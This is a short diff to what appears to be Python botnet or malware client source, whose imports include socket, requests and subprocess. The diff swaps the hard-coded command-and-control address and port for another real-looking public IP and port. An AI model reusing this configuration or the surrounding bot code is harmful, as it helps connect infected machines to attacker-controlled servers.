@@ -3,8 +3,8 @@ import socket, threading, time, random, requests, os, subprocess
 from os import urandom
 from socket import IPPROTO_TCP
 
-C2_ADDRESS  = "87.106.232.239"
-C2_PORT     = 5555
+C2_ADDRESS  = "45.137.205.164"
+C2_PORT     = 2045
 
 
 
